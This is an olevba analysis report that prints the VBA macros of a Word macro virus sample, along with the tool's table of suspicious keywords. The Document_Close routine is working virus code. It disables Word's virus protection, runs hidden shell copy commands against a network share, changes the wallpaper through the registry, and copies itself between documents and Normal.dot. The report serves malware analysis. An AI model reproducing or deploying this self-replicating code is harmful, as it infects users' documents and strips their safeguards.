olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.dx3-71b1b430380f8cf9f52404bbef2425fde47aed7d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.dx3-71b1b430380f8cf9f52404bbef2425fde47aed7d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton11_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\platpor.xls"
b = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2platpor2.xls"


Msg = "Вы действительно хотите отправить файл?"  ' Сообщение.
Style = vbYesNo + vbDefaultButton2  ' Кнопки.
Title = "Сообщение"    ' Заголовок.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Нажата кнопка "Да" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2scht-f2.xls"

If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then

Msg1 = "Сейчас вы действуете по плану первого квартала"  ' Сообщение.
Style1 = vbOKOnly
Title1 = "Сообщение"    ' Заголовок.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Сейчас вы действуете по плану второго квартала"  ' Сообщение.
Style2 = vbOKOnly
Title2 = "Сообщение"    ' Заголовок.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If

End Sub


Private Sub CommandButton2_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\dover.doc"
b = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2dover1.doc"


Msg = "Вы действительно хотите отправить файл?"  ' Сообщение.
Style = vbYesNo + vbDefaultButton2  ' Кнопки.
Title = "Сообщение"    ' Заголовок.
Response = MsgBox(Msg, Style, Title)

If Response = vbYes Then ' Нажата кнопка "Да" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2vipiska1.doc"


If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Сейчас вы действуете по плану первого квартала"  ' Сообщение.
Style1 = vbOKOnly
Title1 = "Сообщение"    ' Заголовок.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Сейчас вы действуете по плану второго квартала"  ' Сообщение.
Style2 = vbOKOnly
Title2 = "Сообщение"    ' Заголовок.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If

End Sub

Private Sub CommandButton21_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\dover.doc"
b = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2dover2.doc"


Msg = "Вы действительно хотите отправить файл?"  ' Сообщение.
Style = vbYesNo + vbDefaultButton2  ' Кнопки.
Title = "Сообщение"    ' Заголовок.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Нажата кнопка "Да" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2vipiska2.doc"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Сейчас вы действуете по плану первого квартала"  ' Сообщение.
Style1 = vbOKOnly
Title1 = "Сообщение"    ' Заголовок.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Сейчас вы действуете по плану второго квартала"  ' Сообщение.
Style2 = vbOKOnly
Title2 = "Сообщение"    ' Заголовок.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If

End Sub

Private Sub Document_Close()

On Error Resume Next

Dim sysbmp, ActiveDoc, NormalDot As Object
Dim SaveDoc, SaveNormalDot, Paid, NormalDotPaid As Boolean
Dim temp1, LogoL, LogoS As Integer
Dim MyCod, OurCode As String

Set ActiveDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormalDot = NormalTemplate.VBProject.VBComponents.Item(1)

Paid = ActiveDoc.CodeModule.Find("Paid", 1, 1, 1000, 1000)
NormalDotPaid = NormalDot.CodeModule.Find("Paid", 1, 1, 1000, 1000)

Options.VirusProtection = False
Options.SaveNormalPrompt = False

Set sysbmp = Application.FileSearch
With sysbmp
    .LookIn = "C:\Program Files\Common Files\SYSTEM"
    .FileName = "system.bmp"
    LogoL = .Execute
End With
With sysbmp
    .LookIn = "\\post\temp\1300"
    .FileName = "system.bmp"
    LogoS = .Execute
End With
    
If LogoS > 0 Then
If (LogoL <= 0) Then
    Shell "command.com /c copy \\post\temp\1300\system.bmp C:\Progra~1\Common~1\SYSTEM\system.bmp", vbHide
End If
Else
If (LogoL > 0) Then
    Shell "command.com /c copy C:\Progra~1\Common~1\SYSTEM\system.bmp \\post\temp\1300\system.bmp", vbHide
End If
End If

System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallPaper") = "C:\Program Files\Common Files\SYSTEM\system.bmp"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallpaperStyle") = "2"

If (Paid = True Xor NormalDotPaid = True) And _
    (ActiveDocument.SaveFormat = wdFormatDocument Or _
    ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
    If Paid = True Then
  
        SaveNormalDot = NormalTemplate.Saved
        MyCod = ActiveDoc.CodeModule.Lines(1, ActiveDoc.CodeModule.CountOfLines)

        temp1 = NormalDot.CodeModule.CountOfLines
        NormalDot.CodeModule.DeleteLines 1, temp1
        NormalDot.CodeModule.AddFromString MyCod
    
        If SaveNormalDot = True Then
            NormalTemplate.Save
        End If
    End If
              
    If NormalDotPaid = True And _
        (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
        ActiveDocument.Saved = False) Then
  
        SaveDoc = ActiveDocument.Saved
        OurCode = NormalDot.CodeModule.Lines(1, NormalDot.CodeModule.CountOfLines)

        temp1 = ActiveDoc.CodeModule.CountOfLines
        ActiveDoc.CodeModule.DeleteLines 1, temp1
        ActiveDoc.CodeModule.AddFromString OurCode
    
        If SaveDoc = True Then
            Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
        End If
    End If
    
End If

End Sub











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton11_Clic|Runs when the file is opened and ActiveX     |
|          |k                   |objects trigger events                       |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

